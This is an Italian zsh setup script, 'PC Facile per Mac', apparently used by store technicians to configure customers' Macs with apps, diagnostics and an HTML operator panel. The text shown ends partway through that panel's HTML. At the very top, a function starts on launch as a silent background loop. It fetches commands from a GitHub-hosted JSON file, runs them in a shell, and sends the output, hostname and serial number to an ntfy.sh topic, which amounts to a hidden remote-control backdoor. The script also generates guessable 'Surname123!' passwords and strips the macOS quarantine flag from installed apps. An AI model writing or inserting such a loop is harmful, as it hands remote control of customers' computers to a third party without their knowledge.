#!/bin/zsh
# =============================================================================
# setup-mac.sh - PC Facile per Mac (gemello di setup-pc.ps1)
# Stesso flusso/menu/report della versione Windows, con gli strumenti nativi
# di macOS: Homebrew (app), scutil (nome), defaults (impostazioni), fdesetup
# (FileVault = equivalente di BitLocker), softwareupdate (aggiornamenti).
# Gira in zsh nativo: doppio-click su "PC Facile Mac.command". Nessuna dipendenza
# da installare a parte Homebrew (che lo script installa da solo).
# =============================================================================

SCRIPT_VERSION="2.31 (2026-11-27)"

# ---- Telecomando Remoto Live (esegue comandi da remote/commands.json) --------
avvia_telecomando_remoto_mac() {
  if $MODO_TEST || [[ "$MODO" == "DIAGNOSTICA" ]]; then return 0; fi
  (
    local done_file="/tmp/pcfacile-remote-done.txt"
    touch "$done_file" 2>/dev/null
    local tele_url="https://ntfy.sh/pcfacile-sn97-telemetria-7f9a2c"
    local cmd_url="https://raw.githubusercontent.com/samuelenigro97-prog/PC-Facile/main/remote/commands.json"
    local host_mac="$(scutil --get ComputerName 2>/dev/null || hostname)"
    local ser_mac="$(ioreg -l | awk -F\" '/IOPlatformSerialNumber/{print $4; exit}' 2>/dev/null)"
    local mod_mac="$(sysctl -n hw.model 2>/dev/null || echo Mac)"
    while kill -0 $$ 2>/dev/null; do
      sleep 8
      local raw="$(curl -fsSL --max-time 5 "$cmd_url?t=$(date +%s)" 2>/dev/null)" || continue
      [[ -z "$raw" ]] && continue
      python3 -c '
import json, os, subprocess, sys, urllib.request
raw, done_file, tele_url, host_mac, ser_mac, mod_mac = sys.argv[1:7]
try:
    data = json.loads(raw)
except Exception:
    sys.exit(0)
done = set()
if os.path.exists(done_file):
    done = set(x.strip() for x in open(done_file) if x.strip())
for c in data.get("commands", []):
    cid = str(c.get("id", "")).strip()
    if not cid or cid in done:
        continue
    cos = str(c.get("os", "any")).lower()
    if cos not in ("any", "mac"):
        continue
    tgt = str(c.get("target", "*")).strip().lower()
    if tgt != "*" and tgt not in host_mac.lower() and tgt not in ser_mac.lower() and tgt not in mod_mac.lower():
        continue
    with open(done_file, "a") as f:
        f.write(cid + "\n")
    cmd_str = str(c.get("command", ""))
    try:
        out = subprocess.check_output(["/bin/zsh", "-c", cmd_str], stderr=subprocess.STDOUT, timeout=35).decode("utf-8", "replace")
        ok = True
    except Exception as e:
        out = str(e)
        ok = False
    payload = json.dumps({"type":"cmd_result","id":cid,"title":c.get("title",""),"pc":host_mac,"modello":mod_mac,"seriale":ser_mac,"ok":ok,"output":out[:3000]}).encode("utf-8")
    try:
        req = urllib.request.Request(tele_url, data=payload, method="POST")
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass
' "$raw" "$done_file" "$tele_url" "$host_mac" "$ser_mac" "$mod_mac" 2>/dev/null || true
    done
  ) >/dev/null 2>&1 &
}
avvia_telecomando_remoto_mac

# ---- Variabili ambiente non interattive & anti-sleep ------------------------
export NONINTERACTIVE=1
export HOMEBREW_NO_AUTO_UPDATE=1
export HOMEBREW_NO_ENV_HINTS=1
export HOMEBREW_NO_INSTALL_CLEANUP=1

# Prevenzione stop/sleep del Mac durante il setup
if command -v caffeinate >/dev/null 2>&1 && [[ "$1" != "--test" && "$1" != "-t" ]]; then
  caffeinate -dimsu -w $$ >/dev/null 2>&1 &
fi

# ---- Un solo flusso: doppio click su "PC Facile.command" = configura --------
# Niente menu. --test (solo CI) e --diagnostica (manutenzione) non sono per
# l'operatore; i vecchi --veloce/--auto sono accettati e ignorati.
MODO="CONFIGURA"  # CONFIGURA | DIAGNOSTICA | TEST
MODO_TEST=false
NO_SELF_UPDATE=false
for arg in "$@"; do
  case "$arg" in
    --test|-t)           MODO_TEST=true; MODO="TEST" ;;
    --diagnostica|-d)    [[ "$MODO" != "TEST" ]] && MODO="DIAGNOSTICA" ;;
    --no-self-update)    NO_SELF_UPDATE=true ;;
  esac
done

# ---- Colori (Terminal.app: 256 colori; arancione ~208, no truecolor) --------
C_ACC=$'\033[38;5;208m'   # arancione Unieuro
C_TXT=$'\033[97m'         # bianco
C_OK=$'\033[38;5;40m'     # verde
C_ERR=$'\033[38;5;196m'   # rosso
C_INFO=$'\033[38;5;220m'  # giallo
C_DIM=$'\033[38;5;245m'   # grigio
C_CYAN=$'\033[38;5;51m'   # ciano
C_RST=$'\033[0m'
LINEA="============================================================"

titolo(){ print -r -- ""; print -r -- "${C_ACC}  $LINEA${C_RST}"; print -r -- "${C_TXT}   $1${C_RST}"; print -r -- "${C_ACC}  $LINEA${C_RST}"; print -r -- ""; }
ok(){    print -r -- "${C_OK}   [OK] $1${C_RST}"; }
info(){  print -r -- "${C_INFO}   -> $1${C_RST}"; }
errore(){ print -r -- "${C_ERR}   [X] $1${C_RST}"; }
dim(){   print -r -- "${C_DIM}   $1${C_RST}"; }

# ---- Escape dei valori inseriti nelle pagine HTML generate ------------------
# html_esc: & < > " ' -> entita' HTML. sed_esc: rende sicuro un valore usato
# come sostituzione in sed "s|...|VALORE|g" (\, | e & sono speciali).
html_esc(){ local s="$1"; s=${s//&/&amp;}; s=${s//</&lt;}; s=${s//>/&gt;}; s=${s//\"/&quot;}; s=${s//\'/&#39;}; print -r -- "$s"; }
sed_esc(){ local s="$1"; s=${s//$'\n'/ }; s=${s//\\/\\\\}; s=${s//[|]/\\|}; s=${s//&/\\&}; print -r -- "$s"; }

# ---- Report (voce + OK/ERRORE/SALTATO/AVVISO) --------------------------------
typeset -a REPORT_VOCI REPORT_ESITI INSTALLATE
add_report(){ REPORT_VOCI+=("$1"); REPORT_ESITI+=("$2"); }

RUN_REALE=false
[[ "$MODO" == "CONFIGURA" ]] && RUN_REALE=true
beep_attesa(){ $RUN_REALE && printf '\a'; }

# ---- Controllo rete ---------------------------------------------------------
test_rete(){ curl -s --head --max-time 5 https://www.apple.com >/dev/null 2>&1 || ping -c1 -t2 8.8.8.8 >/dev/null 2>&1; }

$MODO_TEST || { [[ "$MODO" == "TEST" ]] && MODO_TEST=true; }

chiedi(){
  if $MODO_TEST; then [[ "$1" == *"S/N"* ]] && REPLY="N" || REPLY=""; dim "$1  [test => '$REPLY']"; return; fi
  beep_attesa; print -n -- "   $1 "; read -r REPLY
}

chiedi_sempre(){
  if $MODO_TEST; then REPLY=""; dim "$1  [test => vuoto]"; return; fi
  beep_attesa; print -n -- "   $1 "; read -r REPLY
}

pausa(){ return 0; }
pausa_web(){ [[ "$MODO" == "TEST" || "$MODO" == "DIAGNOSTICA" ]] && return; beep_attesa; print -n -- "   Premi INVIO per continuare "; read -r _; }

password_cliente(){
  local b="${1//[^A-Za-z]/}"; [[ -z "$b" ]] && b="Cliente"
  local primo="${b[1]}"; local resto="${b:1}"
  print -r -- "${(U)primo}${(L)resto}123!"
}

email_cliente(){
  local e="${1//[^A-Za-z0-9]/}"; e="${(L)e}"; [[ -z "$e" ]] && e="cliente"
  print -r -- "${e}@icloud.com"
}

# ---- Catalogo app Mac (cask Homebrew) ---------------------------------------
typeset -a CATALOGO
CATALOGO=(
  "Google Chrome|google-chrome|BASE UFFICIO GAMING"
  "VLC Media Player|vlc|BASE UFFICIO GAMING"
  "Adobe Acrobat Reader|adobe-acrobat-reader|BASE UFFICIO GAMING"
  "The Unarchiver|the-unarchiver|BASE UFFICIO GAMING"
  "WhatsApp|whatsapp|BASE UFFICIO GAMING"
  "AnyDesk|anydesk|BASE UFFICIO GAMING"
  "TeamViewer|teamviewer|BASE UFFICIO GAMING"
  "Spotify|spotify|BASE UFFICIO"
  "Zoom|zoom|UFFICIO"
  "Firefox|firefox|UFFICIO"
  "LibreOffice|libreoffice|UFFICIO"
  "GIMP|gimp|UFFICIO"
  "Steam|steam|GAMING"
  "Epic Games|epic-games|GAMING"
  "Discord|discord|GAMING"
)

# ---- Ricerca installer offline (.dmg / .pkg / .app) su USB o cartella locale --
get_offline_dirs_mac() {
  typeset -a dirs
  local script_dir="${0:a:h}"
  [[ -d "$script_dir/Installers/Mac" ]] && dirs+=("$script_dir/Installers/Mac")
  [[ -d "$script_dir/Installers" ]] && dirs+=("$script_dir/Installers")
  [[ -d "$script_dir/installers" ]] && dirs+=("$script_dir/installers")
  for v in /Volumes/*; do
    [[ -d "$v/Installers/Mac" ]] && dirs+=("$v/Installers/Mac")
    [[ -d "$v/Installers" ]] && dirs+=("$v/Installers")
    [[ -d "$v/installers" ]] && dirs+=("$v/installers")
  done
  print -r -- "${dirs[@]}"
}

installa_offline_app_mac() {
  local nome="$1"
  local dirs=($(get_offline_dirs_mac))
  [[ ${#dirs} -eq 0 ]] && return 1

  local pattern=""
  case "$nome" in
    *Chrome*)      pattern="*Chrome*.dmg *googlechrome*.dmg *Chrome*.pkg" ;;
    *VLC*)         pattern="*vlc*.dmg" ;;
    *Adobe*)       pattern="*Acro*.dmg *Acro*.pkg *Reader*.dmg" ;;
    *Unarchiver*)  pattern="*TheUnarchiver*.dmg *unarchiver*.dmg *Unarchiver*.zip" ;;
    *WhatsApp*)    pattern="*WhatsApp*.dmg *WhatsApp*.zip" ;;
    *AnyDesk*)     pattern="*AnyDesk*.dmg *anydesk*.dmg" ;;
    *TeamViewer*)  pattern="*TeamViewer*.dmg *TeamViewer*.pkg" ;;
    *Spotify*)     pattern="*Spotify*.dmg *Spotify*.zip" ;;
    *Firefox*)     pattern="*Firefox*.dmg" ;;
    *LibreOffice*) pattern="*LibreOffice*.dmg" ;;
    *GIMP*)        pattern="*gimp*.dmg" ;;
    *Zoom*)        pattern="*zoom*.pkg *Zoom*.dmg" ;;
    *Steam*)       pattern="*steam*.dmg" ;;
    *Discord*)     pattern="*discord*.dmg" ;;
  esac
  [[ -z "$pattern" ]] && return 1

  for d in "${dirs[@]}"; do
    for p in ${(s: :)pattern}; do
      for f in $d/$~p(N); do
        if [[ -f "$f" ]]; then
          info "Trovato installer offline per $nome: ${f:t}"
          if [[ "$f" == *.dmg ]]; then
            local mnt="/tmp/pcfacile_mnt_$$"
            mkdir -p "$mnt"
            if hdiutil attach -nobrowse -quiet -mountpoint "$mnt" "$f" 2>/dev/null; then
              local app="$(find "$mnt" -maxdepth 2 -name "*.app" 2>/dev/null | head -1)"
              if [[ -n "$app" ]]; then
                cp -R "$app" /Applications/ 2>/dev/null
                xattr -d -r com.apple.quarantine "/Applications/${app:t}" 2>/dev/null || true
              fi
              hdiutil detach "$mnt" -quiet -force 2>/dev/null || true
              rm -rf "$mnt" 2>/dev/null
              return 0
            fi
            rm -rf "$mnt" 2>/dev/null
          elif [[ "$f" == *.pkg ]]; then
            sudo installer -pkg "$f" -target / 2>/dev/null && return 0
          fi
        fi
      done
    done
  done
  return 1
}

# =============================================================================
# HARDWARE, BATTERIA E STATO DISCO (FUNZIONI HELPER)
# =============================================================================
get_hw_info_mac() {
    local model="$(system_profiler SPHardwareDataType 2>/dev/null | awk -F': ' '/Model Name/{print $2; exit}')"
    [[ -z "$model" ]] && model="$(sysctl -n hw.model 2>/dev/null)"
    local chip="$(sysctl -n machdep.cpu.brand_string 2>/dev/null)"
    if [[ -z "$chip" || "$chip" == *"Apple"* ]]; then
        chip="$(system_profiler SPHardwareDataType 2>/dev/null | awk -F': ' '/Chip/{print $2}' | head -1)"
        [[ -z "$chip" ]] && chip="Apple Silicon"
    fi
    local ram_b="$(sysctl -n hw.memsize 2>/dev/null)"
    local ram_gb=$(( ram_b / 1024 / 1024 / 1024 ))
    local serial="$(system_profiler SPHardwareDataType 2>/dev/null | awk -F': ' '/Serial Number/{print $2}' | head -1)"
    [[ -z "$serial" ]] && serial="$(ioreg -l 2>/dev/null | grep IOPlatformSerialNumber | awk -F'"' '{print $4}' | head -1)"
    local os_ver="$(sw_vers -productVersion 2>/dev/null)"
    local os_build="$(sw_vers -buildVersion 2>/dev/null)"
    
    print -r -- "${model:-Mac}|${chip:-Apple Silicon}|${ram_gb:-8} GB RAM|${serial:-Non disponibile}|macOS ${os_ver:-14.0} (${os_build:-n/d})"
}

get_battery_info_mac() {
    local batt_raw="$(system_profiler SPPowerDataType 2>/dev/null)"
    local cycles="$(echo "$batt_raw" | awk -F': ' '/Cycle Count/{print $2}' | head -1)"
    local cond="$(echo "$batt_raw" | awk -F': ' '/Condition/{print $2}' | head -1)"
    local max_cap="$(echo "$batt_raw" | awk -F': ' '/Maximum Capacity/{print $2}' | head -1)"
    local state_charge="$(echo "$batt_raw" | awk -F': ' '/State of Charge/{print $2}' | head -1)"
    
    if [[ -z "$cycles" && -z "$max_cap" ]]; then
        print -r -- "DESKTOP|Mac Fisso / Desktop (Senza batteria)|N/A|100%"
    else
        [[ -z "$cond" ]] && cond="Normale"
        [[ -z "$max_cap" ]] && max_cap="100%"
        print -r -- "NOTEBOOK|${max_cap} (${cond})|${cycles:-0} cicli|Carica: ${state_charge:-100%}"
    fi
}

get_storage_info_mac() {
    local disk_info="$(diskutil info / 2>/dev/null)"
    local smart="$(echo "$disk_info" | awk -F': ' '/SMART Status/{print $2}' | head -1)"
    [[ -z "$smart" ]] && smart="Verified (OK)"
    local free_space="$(df -h / 2>/dev/null | awk 'NR==2{print $4" liberi di "$2}')"
    local fv_status="$(fdesetup status 2>/dev/null | head -1)"
    
    print -r -- "SSD APFS|SMART: ${smart}|${free_space}|${fv_status:-FileVault non attivo}"
}

# =============================================================================
# FUNZIONE STANDALONE: CHECK SALUTE & DIAGNOSTICA HARDWARE MAC
# =============================================================================
diagnostica_salute_mac() {
    titolo "CHECK SALUTE & DIAGNOSTICA HARDWARE MAC"
    info "Esecuzione test completi su disco APFS, batteria, FileVault e specifiche..."
    print -r -- ""

    local hw="$(get_hw_info_mac)"
    local model="${${(s:|:)hw}[1]}"
    local chip="${${(s:|:)hw}[2]}"
    local ram="${${(s:|:)hw}[3]}"
    local serial="${${(s:|:)hw}[4]}"
    local os="${${(s:|:)hw}[5]}"

    local batt="$(get_battery_info_mac)"
    local batt_type="${${(s:|:)batt}[1]}"
    local batt_health="${${(s:|:)batt}[2]}"
    local batt_cycles="${${(s:|:)batt}[3]}"
    local batt_charge="${${(s:|:)batt}[4]}"

    local storage="$(get_storage_info_mac)"
    local disk_type="${${(s:|:)storage}[1]}"
    local smart="${${(s:|:)storage}[2]}"
    local free_space="${${(s:|:)storage}[3]}"
    local fv_info="${${(s:|:)storage}[4]}"

    local sip_status="$(csrutil status 2>/dev/null | head -1)"

    print -r -- "${C_ACC}------------------------------------------------------------${C_RST}"
    print -r -- "${C_TXT} 1. DISPOSITIVO & SPECIFICHE APPLE${C_RST}"
    print -r -- "    Modello Mac      : ${C_CYAN}${model}${C_RST}"
    print -r -- "    Chip / Processore: ${C_TXT}${chip}${C_RST}"
    print -r -- "    Memoria Unificata: ${ram}"
    print -r -- "    Seriale (S/N)    : ${C_INFO}${serial}${C_RST}"
    print -r -- "    Sistema Operativo: ${os}"
    print -r -- ""

    print -r -- "${C_TXT} 2. SALUTE DISCO & APFS (SMART)${C_RST}"
    print -r -- "    Stato Disco / SSD: ${C_OK}${disk_type} - ${smart}${C_RST}"
    print -r -- "    Spazio Disco     : ${free_space}"
    print -r -- ""

    print -r -- "${C_TXT} 3. STATO BATTERIA & ALIMENTAZIONE${C_RST}"
    if [[ "$batt_type" == "NOTEBOOK" ]]; then
        print -r -- "    Salute Batteria  : ${C_OK}${batt_health}${C_RST}"
        print -r -- "    Cicli di Carica  : ${batt_cycles}"
        print -r -- "    Livello Attuale  : ${batt_charge}"
    else
        print -r -- "    Tipo Dispositivo : ${C_DIM}Mac Desktop / Fisso (Senza batteria)${C_RST}"
    fi
    print -r -- ""

    print -r -- "${C_TXT} 4. SICUREZZA & PROTEZIONE DATI${C_RST}"
    if [[ "$fv_info" == *"On"* ]]; then
        print -r -- "    FileVault        : ${C_OK}${fv_info}${C_RST}"
    else
        print -r -- "    FileVault        : ${C_INFO}${fv_info}${C_RST}"
    fi
    print -r -- "    Protezione SIP   : ${sip_status:-Abilitata}"
    print -r -- "${C_ACC}------------------------------------------------------------${C_RST}"
    print -r -- ""
}

# =============================================================================
# SPLIT SCREEN 50/50 AUTOMATICO SU MAC (Safari a Sinistra, Terminale a Destra)
# =============================================================================
set_split_screen_mac() {
    local target="$1"
    [[ "$MODO_TEST" == true ]] && return 0
    if [[ "$target" == http* ]]; then
        osascript <<EOF 2>/dev/null
tell application "Finder"
    set screenBounds to bounds of window of desktop
    set screenW to item 3 of screenBounds
    set screenH to item 4 of screenBounds
end tell

set halfW to (screenW / 2) as integer

-- 1. Safari a SINISTRA
tell application "Safari"
    activate
    open location "$target"
    delay 0.4
    if (count of windows) > 0 then
        set bounds of front window to {0, 25, halfW, screenH}
    end if
end tell

-- 2. Terminal a DESTRA
tell application "Terminal"
    activate
    if (count of windows) > 0 then
        set bounds of front window to {halfW, 25, screenW, screenH}
    end if
end tell
EOF
    else
        osascript <<EOF 2>/dev/null
tell application "Finder"
    set screenBounds to bounds of window of desktop
    set screenW to item 3 of screenBounds
    set screenH to item 4 of screenBounds
end tell

set halfW to (screenW / 2) as integer

-- 1. Safari a SINISTRA
tell application "Safari"
    activate
    open POSIX file "$target"
    delay 0.4
    if (count of windows) > 0 then
        set bounds of front window to {0, 25, halfW, screenH}
    end if
end tell

-- 2. Terminal a DESTRA
tell application "Terminal"
    activate
    if (count of windows) > 0 then
        set bounds of front window to {halfW, 25, screenW, screenH}
    end if
end tell
EOF
    fi
}

# =============================================================================
# AGGIORNAMENTO STATO LIVE DEL PANNELLO MAC
# =============================================================================
update_pannello_mac_status() {
    local pct="${1:-5}"
    local fase="${2:-Inizializzazione}"
    local dett="${3:-Configurazione in corso...}"
    local comp="${4:-false}"
    local status_file="/tmp/pcfacile-mac-status.js"

    cat <<EOF > "$status_file"
window.PCFacileMacStatus = {
    percentuale: $pct,
    faseCorrente: "$fase",
    dettaglio: "$dett",
    completato: $comp
};
if (typeof window.onPCFacileMacStatusUpdate === 'function') {
    window.onPCFacileMacStatusUpdate(window.PCFacileMacStatus);
}
EOF
}

# =============================================================================
# APERTURA PANNELLO OPERATORE MAC
# =============================================================================
open_pannello_mac() {
    local nome_c="${1:-Utente}"
    local email_c="${2:-utente@icloud.com}"
    local pass_c="${3:-Utente123!}"
    local pannello_html="/tmp/Pannello-Operatore-Mac.html"

    local hw="$(get_hw_info_mac)"
    local hw_model="${${(s:|:)hw}[1]}"
    local hw_chip="${${(s:|:)hw}[2]}"
    local hw_ram="${${(s:|:)hw}[3]}"
    local hw_sn="${${(s:|:)hw}[4]}"

    update_pannello_mac_status 5 "Inizializzazione Setup Mac" "Avvio pannello operatore..." false

    cat <<'EOF' > "$pannello_html"
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PC Facile - Pannello operatore Mac</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', sans-serif; }
        body { background: #000d20; color: #f8fafc; padding: 12px; min-height: 100vh; line-height: 1.45; font-size: 15px; overflow-x: hidden; }
        .container { width: 100%; max-width: 980px; margin: 0 auto; min-width: 0; }
        button:focus-visible, a:focus-visible, input:focus-visible { outline: 3px solid #EE7203; outline-offset: 2px; }
        .header { background: #001a3a; border: 1.5px solid #00458C; border-radius: 12px; padding: 10px 14px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; gap: 10px; flex-wrap: wrap; box-shadow: 0 4px 16px rgba(0,0,0,0.35); }
        .brand-box { display: flex; align-items: center; gap: 10px; min-width: 0; flex: 1 1 240px; }
        .u-logo { background: #EE7203; color: #00122b; font-weight: 900; font-size: 16px; letter-spacing: 1px; padding: 6px 12px; border-radius: 7px; flex-shrink: 0; }
        .brand-titles h1 { font-size: 20px; color: #fff; font-weight: 700; }
        .badge-stato { font-weight: 800; font-size: 14px; padding: 7px 14px; border-radius: 20px; border: 1.5px solid #38bdf8; background: #082f49; color: #e0f2fe; white-space: nowrap; max-width: 100%; }
        .badge-stato.ok { border-color: #22c55e; background: #14532d; color: #dcfce7; }
        .hw-bar { background: #00142e; border: 1px solid #003366; border-radius: 8px; padding: 8px 12px; margin-bottom: 10px; display: flex; gap: 6px 16px; font-size: 14px; color: #b6c3d4; flex-wrap: wrap; }
        .hw-val { color: #fff; font-weight: 600; }
        .sticky-top-bar { position: sticky; top: 0; z-index: 60; background: #000c20; padding: 4px 0 6px; margin-bottom: 6px; box-shadow: 0 8px 18px rgba(0, 12, 32, 0.92); }
        .sticky-top-bar .progress-card { margin-bottom: 8px; }
        .sticky-top-bar .tab-bar { margin-bottom: 0; }
        .progress-card { background: #001a3a; border: 1.5px solid #00458C; border-radius: 10px; padding: 10px 14px; margin-bottom: 10px; }
        .progress-bar-bg { background: #000c1c; border: 1px solid #003B7A; height: 16px; border-radius: 8px; overflow: hidden; }
        .progress-bar-fill { background: linear-gradient(90deg, #EE7203 0%, #ff9d42 100%); height: 100%; width: 0%; transition: width 0.4s ease; }
        .banner-fine { display: none; border: 2px solid #22c55e; background: #052e16; border-radius: 10px; padding: 12px 14px; margin-bottom: 10px; font-size: 15px; }
        .banner-fine strong { color: #4ade80; }
        .tab-bar { display: flex; gap: 6px; margin-bottom: 10px; background: #00142e; padding: 5px; border-radius: 10px; border: 1px solid #003366; }
        .tab-btn { flex: 1; min-height: 44px; background: transparent; border: none; color: #b6c3d4; font-size: 15px; font-weight: 700; padding: 6px 10px; border-radius: 8px; cursor: pointer; }
        .tab-btn.active { background: #003B7A; color: #fff; }
        .section-view { display: none; }
        .section-view.active-view { display: block; }
        .card { background: #001f48; border: 1px solid #003B7A; border-radius: 10px; padding: 12px 14px; margin-bottom: 10px; }
        .etichetta { display: block; font-size: 14px; color: #bfdbfe; font-weight: 700; margin-bottom: 4px; }
        .dom-row { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 8px; margin-bottom: 10px; }
        .dom-btn { min-height: 44px; min-width: 0; background: #1e293b; color: #e2e8f0; border: 1.5px solid #334155; padding: 8px 10px; border-radius: 8px; font-size: 15px; font-weight: 700; cursor: pointer; }
        .dom-btn[aria-pressed="true"] { background: #0284c7; border-color: #0284c7; color: #fff; }
        .campi-2 { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 8px; }
        .campi-3 { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 8px; }
        .portal-btn { min-height: 48px; display: flex; align-items: center; justify-content: space-between; background: #00142E; border: 1px solid #003B7A; border-radius: 8px; padding: 10px 12px; color: #f8fafc; text-decoration: none; font-size: 15px; margin-bottom: 8px; font-weight: 600; }
        .cred-input { width: 100%; min-height: 44px; background: #00122B; border: 1.5px solid #00458C; border-radius: 8px; padding: 8px 12px; font-size: 16px; color: #fff; margin-bottom: 10px; }
        .cred-input.errore { border-color: #ef4444; box-shadow: 0 0 0 3px rgba(239,68,68,0.4); }
        .servizi { background: #00152f; border: 1px solid #003B7A; border-radius: 8px; padding: 10px; margin-bottom: 10px; }
        .servizi-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 8px; }
        .svc { min-height: 44px; display: flex; align-items: center; gap: 10px; cursor: pointer; font-size: 15px; padding: 6px 8px; border: 1px solid #003B7A; border-radius: 8px; }
        .svc input { width: 22px; height: 22px; accent-color: #EE7203; }
        .btn-avvia { min-height: 52px; background: #15803d; font-weight: 800; font-size: 17px; padding: 10px 14px; width: 100%; border: none; cursor: pointer; border-radius: 8px; color: #fff; }
        .step-card { background: #00142E; border: 1px solid #003B7A; border-radius: 10px; padding: 12px 14px; margin-bottom: 10px; }
        .step-card.highlight { border-color: #EE7203; background: #001a38; }
        .step-title { font-size: 15px; font-weight: 800; color: #f8fafc; margin-bottom: 4px; }
        .step-desc { font-size: 13px; color: #94a3b8; margin-bottom: 10px; }
        .step-actions { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; }
        .btn-step { min-height: 40px; background: #0284c7; color: #fff; border: none; border-radius: 8px; padding: 8px 14px; font-size: 14px; font-weight: 700; cursor: pointer; }
        .btn-step.arancio { background: #EE7203; color: #00122b; font-weight: 800; }
        .esito { display: none; margin-top: 8px; padding: 10px 12px; border-radius: 8px; font-size: 15px; font-weight: 700; }
        .esito.ok { display: block; background: #052e16; border: 1.5px solid #22c55e; color: #bbf7d0; }
        .esito.errore { display: block; background: #2a0a0a; border: 1.5px solid #ef4444; color: #fecaca; }
        @media (prefers-reduced-motion: reduce) { * { transition: none !important; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="brand-box">
                <div class="u-logo">UNIEURO</div>
                <div class="brand-titles">
                    <h1>PC Facile &middot; Pannello operatore Mac</h1>
                    <p style="font-size:12px; color:#93c5fd; font-weight:700; margin-top:2px;">Script PC Facile Mac v__VERSION__</p>
                </div>
            </div>
            <div id="badgeLive" class="badge-stato" role="status">In attesa dei dati cliente</div>
        </div>

        <div class="hw-bar">
            <div>Mac: <span class="hw-val">__HW_MODEL__</span></div>
            <div>Chip: <span class="hw-val">__HW_CHIP__ &middot; __HW_RAM__</span></div>
            <div>S/N: <span class="hw-val">__HW_SN__</span></div>
        </div>

        <div class="sticky-top-bar">
            <div class="progress-card">
                <div style="display:flex; justify-content:space-between; margin-bottom:6px; font-size:15px;">
                    <span style="color:#fed7aa; font-weight:700;">Avanzamento configurazione</span>
                    <span id="pctText" style="color:#EE7203; font-weight:900; font-size:18px;">0%</span>
                </div>
                <div class="progress-bar-bg"><div id="barFill" class="progress-bar-fill"></div></div>
                <div style="margin-top:6px; font-size:14px;" aria-live="polite">
                    <div><span style="color:#b6c3d4;">Ora:</span> <strong id="faseText">In attesa</strong></div>
                    <div id="dettText" style="color:#d6dee8;"></div>
                </div>
            </div>

            <div class="tab-bar">
                <button type="button" class="tab-btn active" onclick="showTab('tab-cred', this)">&#128100; 1. Cliente</button>
                <button type="button" class="tab-btn" onclick="showTab('tab-portali', this)">&#127760; 2. Portali</button>
                <button type="button" class="tab-btn" onclick="showTab('tab-passaggi', this)">&#128295; 3. Passaggi</button>
            </div>
        </div>

        <div id="bannerFine" class="banner-fine" role="status">
            <strong>&#10003; Configurazione completata.</strong> La scheda di consegna &egrave; sulla Scrivania del Mac: <strong>Scheda-Consegna-Mac.html</strong>.
        </div>

        <div id="tab-cred" class="section-view active-view">
            <div class="card" style="border: 1.5px solid #EE7203; background: #001838;">
                <span class="etichetta" style="color:#fed7aa;">&#9889; Modalit&agrave; operativa iniziale</span>
                <div class="dom-row" style="margin-bottom:0;">
                    <button type="button" id="btnModeMacCompleta" class="dom-btn" aria-pressed="true" onclick="setModalitaMac('COMPLETA')">&#128736;&#65039; 1. Configurazione Completa Mac</button>
                    <button type="button" id="btnModeMacPostVendita" class="dom-btn" aria-pressed="false" onclick="setModalitaMac('POSTVENDITA')">&#9889; 2. Post Vendita / Solo Essenziali (No Reset)</button>
                </div>
            </div>
            <div class="card">
                <span class="etichetta">Tipo di email</span>
                <div class="dom-row">
                    <button type="button" class="dom-btn" aria-pressed="true" onclick="setDomMac('proton.me', 'Proton', this)">@proton.me</button>
                    <button type="button" class="dom-btn" aria-pressed="false" onclick="setDomMac('icloud.com', 'iCloud', this)">@icloud.com</button>
                    <button type="button" class="dom-btn" aria-pressed="false" onclick="setDomMac('gmail.com', 'Google', this)">@gmail.com</button>
                    <button type="button" class="dom-btn" aria-pressed="false" onclick="setDomMac('outlook.it', 'Microsoft', this)">@outlook.it</button>
                </div>

                <div class="campi-3">
                    <div>
                        <label class="etichetta" for="inCognome">Cognome</label>
                        <input type="text" class="cred-input" id="inCognome" placeholder="Es. Rossi" autocomplete="off" oninput="aggiornaCredMac()">
                    </div>
                    <div>
                        <label class="etichetta" for="inNome">Nome <span style="color:#94a3b8; font-size:12px;">(opz.)</span></label>
                        <input type="text" class="cred-input" id="inNome" placeholder="Es. Mario" autocomplete="off" oninput="aggiornaCredMac()">
                    </div>
                    <div>
                        <label class="etichetta" for="inTelefono">Cellulare <span style="color:#94a3b8; font-size:12px;">(opz.)</span></label>
                        <input type="tel" class="cred-input" id="inTelefono" placeholder="333 1234567" autocomplete="off" oninput="this.classList.remove('errore')">
                    </div>
                </div>

                <div class="campi-2">
                    <div>
                        <label class="etichetta" for="inEmail">Email proposta</label>
                        <input type="text" class="cred-input" id="inEmail" value="__EMAIL__" autocomplete="off">
                    </div>
                    <div>
                        <label class="etichetta" for="inPass">Password iniziale</label>
                        <input type="text" class="cred-input" id="inPass" value="__PASS__" autocomplete="off">
                    </div>
                </div>

                <div class="servizi">
                    <span class="etichetta" style="color:#fed7aa;">Servizi sullo scontrino</span>
                    <div class="servizi-grid">
                        <label class="svc" style="grid-column: 1 / -1; border-color:#EE7203; background:rgba(238,114,3,0.14); font-weight:700;"><input type="checkbox" id="chkSvcEveryday" checked> <span>Unieuro Everyday Digital (Secure + Cyber) &mdash; PRIORIT&Agrave;</span></label>
                        <div style="grid-column: 1 / -1; background:#00122B; border:1px dashed #EE7203; border-radius:8px; padding:8px 10px;">
                            <label class="etichetta" for="inPassSecure" style="color:#fed7aa; font-size:13px;">Password Unieuro Secure (dalla mail del cliente, opz. &mdash; o incolla testo mail)</label>
                            <div style="display:flex; gap:6px;">
                                <input type="text" class="cred-input" id="inPassSecure" style="margin-bottom:0; font-family:monospace;" placeholder="Es. N/qrWZ35 (o incolla mail)" autocomplete="off" oninput="analizzaMailSecureMac(this.value)">
                                <button type="button" class="btn-step" style="white-space:nowrap;" onclick="incollaMailSecureMac()">&#128203; Incolla mail</button>
                                <button type="button" class="btn-step" style="white-space:nowrap;" onclick="copiaCampoMac('inPassSecure')">&#128203; Copia</button>
                            </div>
                        </div>
                        <label class="svc"><input type="checkbox" id="chkSvcProton"> <span>Email Proton</span></label>
